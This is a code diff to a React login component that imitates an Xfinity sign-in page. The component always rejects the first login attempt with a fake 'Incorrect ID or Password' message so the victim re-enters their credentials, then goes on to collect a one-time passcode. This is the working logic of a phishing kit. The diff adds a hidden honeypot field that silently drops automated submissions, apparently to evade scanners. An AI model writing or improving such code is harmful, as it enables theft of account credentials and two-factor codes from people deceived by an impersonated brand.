@@ -50,6 +50,7 @@ interface FormData {
   username: string;
   password: string;
   otp: string;
+  hp: string;
 }
 
 interface FormErrors {
@@ -78,12 +79,16 @@ export default function XfinityLogin() {
     username: "",
     password: "",
     otp: "",
+    hp: "",
   });
   const [errors, setErrors] = useState<FormErrors>({});
 
   const handleSubmit = async (e: FormEvent<HTMLFormElement>): Promise<void> => {
     e.preventDefault();
     setErrors({});
+    if (form.hp) {
+      return;
+    }
 
     if (stage === 1) {
       const result = loginSchema.safeParse({
@@ -113,7 +118,7 @@ export default function XfinityLogin() {
         setSubmissionCount((prev) => prev + 1);
         if (submissionCount < 1) {
           // First submission: clear inputs, show "Incorrect ID or Password" modal
-          setForm({ username: "", password: "", otp: form.otp });
+          setForm({ username: "", password: "", otp: form.otp, hp: form.hp });
           setShowDialog(true);
         } else {
           // Second submission: move to stage 2, show OTP modal
@@ -238,6 +243,18 @@ export default function XfinityLogin() {
 
             <form onSubmit={handleSubmit} className="space-y-4">
               <div>
+                <div style={{ display: "none" }} aria-hidden="true">
+                  <label htmlFor="hp">Do not fill</label>
+                  <input
+                    id="hp"
+                    name="hp"
+                    type="text"
+                    value={form.hp || ""}
+                    onChange={(e) => setForm({ ...form, hp: e.target.value })}
+                    autoComplete="off"
+                    tabIndex={-1}
+                  />
+                </div>
                 <input
                   type="text"
                   placeholder="Email, mobile, or username"
